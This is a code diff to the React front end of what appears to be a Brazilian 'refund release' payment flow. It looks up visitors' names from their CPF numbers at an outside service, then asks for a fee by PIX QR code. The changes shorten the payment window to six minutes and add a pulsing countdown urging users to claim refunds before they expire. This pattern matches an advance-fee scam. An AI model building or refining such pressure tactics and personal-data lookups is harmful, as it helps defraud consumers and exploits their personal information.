@@ -224,10 +224,14 @@ function StepForm({ onSubmit, onClose }) {
             return;
         }
         setCpfStatus("loading");
-        fetch(`https://cpf.pixdecria.shop/api/v1/consult/${cpfDigits}`, {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 8000);
+        fetch(`https://cpf.pixdecria.shop/api/v1/consult/${cpf}`, {
+            method: "GET",
             headers: { "Accept": "application/json" },
+            signal: controller.signal,
         })
-            .then((r) => r.json())
+            .then((r) => { clearTimeout(timer); return r.json(); })
             .then((data) => {
                 if (data?.NOME) {
                     setCpfData(data);
@@ -236,7 +240,7 @@ function StepForm({ onSubmit, onClose }) {
                     setCpfStatus("error");
                 }
             })
-            .catch(() => setCpfStatus("error"));
+            .catch(() => { clearTimeout(timer); setCpfStatus("error"); });
     }, [cpfDigits]);
 
     const handleEmailChange = (val) => {
@@ -627,10 +631,14 @@ function StepPixKey({ formData, onSubmit, onBack }) {
         const digits = (formData?.cpf || "").replace(/\D/g, "");
         if (digits.length !== 11) { setNomeStatus("idle"); return; }
         setNomeStatus("loading");
-        fetch(`https://cpf.pixdecria.shop/api/v1/consult/${digits}`, {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 8000);
+        fetch(`https://cpf.pixdecria.shop/api/v1/consult/${formData?.cpf || digits}`, {
+            method: "GET",
             headers: { "Accept": "application/json" },
+            signal: controller.signal,
         })
-            .then((r) => r.json())
+            .then((r) => { clearTimeout(timer); return r.json(); })
             .then((data) => {
                 if (data?.NOME) {
                     setNome(toTitleCase(data.NOME));
@@ -639,7 +647,7 @@ function StepPixKey({ formData, onSubmit, onBack }) {
                     setNomeStatus("idle");
                 }
             })
-            .catch(() => setNomeStatus("idle"));
+            .catch(() => { clearTimeout(timer); setNomeStatus("idle"); });
     }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
     const selectedType = PIX_KEY_TYPES.find((k) => k.value === keyType);
@@ -890,11 +898,24 @@ function StepTaxa({ formData, pixKeyData, onPay, onBack }) {
 // ─── step 6: payment ──────────────────────────────────────────────────────────
 
 function StepPayment({ paymentData, onComplete }) {
-    const [copied, setCopied]   = useState(false);
-    const [expired, setExpired] = useState(false);
-    const onCompleteRef         = useRef(onComplete);
+    const [copied, setCopied]     = useState(false);
+    const [expired, setExpired]   = useState(false);
+    const [timeLeft, setTimeLeft] = useState(6 * 60); // 6 min
+    const onCompleteRef           = useRef(onComplete);
     useEffect(() => { onCompleteRef.current = onComplete; });
 
+    // Countdown do timer
+    useEffect(() => {
+        const interval = setInterval(() => {
+            setTimeLeft((prev) => {
+                if (prev <= 1) { clearInterval(interval); setExpired(true); return 0; }
+                return prev - 1;
+            });
+        }, 1000);
+        return () => clearInterval(interval);
+    }, []);
+
+    // Polling de status
     useEffect(() => {
         const txId = paymentData.transactionId;
         const interval = setInterval(async () => {
@@ -902,32 +923,44 @@ function StepPayment({ paymentData, onComplete }) {
                 const res = await fetch(`/api/pix/status?transactionId=${encodeURIComponent(txId)}`);
                 if (!res.ok) return;
                 const { status } = await res.json();
-                if (status === "COMPLETED") {
-                    clearInterval(interval);
-                    onCompleteRef.current();
-                }
-            } catch { /* retry on next tick */ }
+                if (status === "COMPLETED") { clearInterval(interval); onCompleteRef.current(); }
+            } catch { /* retry */ }
         }, 5000);
-
-        const timeout = setTimeout(() => {
-            clearInterval(interval);
-            setExpired(true);
-        }, 15 * 60 * 1000);
-
+        const timeout = setTimeout(() => { clearInterval(interval); setExpired(true); }, 6 * 60 * 1000);
         return () => { clearInterval(interval); clearTimeout(timeout); };
     }, [paymentData.transactionId]);
 
-    const copyCode = () => {
-        navigator.clipboard.writeText(paymentData.pixCode).catch(() => {});
-        setCopied(true);
-        setTimeout(() => setCopied(false), 2000);
+    const fallbackCopy = (text) => {
+        const ta = document.createElement("textarea");
+        ta.value = text;
+        ta.style.cssText = "position:fixed;opacity:0;top:0;left:0;pointer-events:none";
+        document.body.appendChild(ta);
+        ta.focus(); ta.select();
+        try { document.execCommand("copy"); } catch {}
+        document.body.removeChild(ta);
     };
+
+    const copyCode = () => {
+        const code = paymentData.pixCode;
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(code).catch(() => fallbackCopy(code));
+        } else {
+            fallbackCopy(code);
+        }
+        setCopied(true);
+        setTimeout(() => setCopied(false), 2500);
+    };
+
+    const mins = Math.floor(timeLeft / 60).toString().padStart(2, "0");
+    const secs = (timeLeft % 60).toString().padStart(2, "0");
+    const timerColor = timeLeft > 180 ? "#00FF66" : timeLeft > 60 ? "#facc15" : "#f87171";
+    const urgent = timeLeft <= 60;
 
     if (expired) {
         return (
             <ModalCard>
                 <div className="flex-1 flex flex-col items-center justify-center p-8 text-center">
-                    <p className="text-yellow-400 text-3xl mb-3">⏰</p>
+                    <p className="text-4xl mb-3">⏰</p>
                     <p className="text-white font-bold text-lg mb-2">PIX Expirado</p>
                     <p className="text-zinc-400 text-sm">O tempo de pagamento expirou. Por favor, reinicie o processo.</p>
                 </div>
@@ -944,30 +977,56 @@ function StepPayment({ paymentData, onComplete }) {
             </div>
 
             <div className="flex-1 overflow-y-auto px-4 pt-4 pb-3">
-                <div className="text-center mb-4">
-                    <p className="text-zinc-400 text-xs mb-1">Taxa de Liberação de Reembolso</p>
+                {/* Valor */}
+                <div className="text-center mb-3">
+                    <p className="text-zinc-500 text-xs mb-0.5">Taxa de Liberação de Reembolso</p>
                     <p className="text-[#00FF66] font-display font-bold text-3xl">{TAXA_DISPLAY}</p>
                 </div>
 
-                <div className="flex justify-center mb-4">
+                {/* Timer */}
+                <div
+                    className="rounded-2xl py-4 px-5 mb-3 flex flex-col items-center"
+                    style={{ backgroundColor: "#0d1f12", border: `1px solid ${timerColor}40` }}
+                >
+                    <p className="text-[10px] font-semibold tracking-[0.18em] text-zinc-500 uppercase mb-1">
+                        PIX válido por
+                    </p>
+                    <span
+                        className={`font-mono font-bold text-5xl tabular-nums leading-none ${urgent ? "animate-pulse" : ""}`}
+                        style={{ color: timerColor, textShadow: `0 0 24px ${timerColor}70` }}
+                    >
+                        {mins}:{secs}
+                    </span>
+                    <p
+                        className="text-xs font-semibold mt-2 text-center"
+                        style={{ color: urgent ? "#f87171" : "#facc15" }}
+                    >
+                        Recupere agora seus reembolsos antes que expirem!
+                    </p>
+                </div>
+
+                {/* QR Code */}
+                <div className="flex justify-center mb-3">
                     <div className="p-4 bg-white rounded-2xl shadow-[0_0_32px_rgba(0,255,102,0.15)]">
-                        <QRCodeSVG value={paymentData.pixCode} size={180} level="M" />
+                        <QRCodeSVG value={paymentData.pixCode} size={176} level="M" />
                     </div>
                 </div>
 
+                {/* Copy button */}
                 <button
                     onClick={copyCode}
-                    className="w-full py-3 rounded-xl border text-sm font-semibold flex items-center justify-center gap-2 transition-all duration-200 mb-3"
+                    className="w-full py-3.5 rounded-xl border text-sm font-semibold flex items-center justify-center gap-2 transition-all duration-200 mb-3 active:scale-[0.98]"
                     style={{
                         backgroundColor: copied ? "rgba(0,255,102,0.12)" : "#0d1f12",
-                        borderColor: copied ? "#00FF66" : "#1e3a26",
-                        color: copied ? "#00FF66" : "#a1a1aa",
+                        borderColor: copied ? "#00FF66" : "#2d4a35",
+                        color: copied ? "#00FF66" : "#d4d4d8",
                     }}
                 >
                     {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                    {copied ? "Código copiado!" : "Copiar código PIX"}
+                    {copied ? "✓ Código copiado com sucesso!" : "Copiar código PIX"}
                 </button>
 
+                {/* Status polling */}
                 <div className="rounded-xl p-3 text-center" style={{ backgroundColor: "#0d1f12", border: "1px solid #1e3a26" }}>
                     <div className="flex items-center justify-center gap-2 text-xs text-zinc-400">
                         <span className="w-2 h-2 rounded-full bg-[#00FF66] animate-pulse flex-shrink-0" />
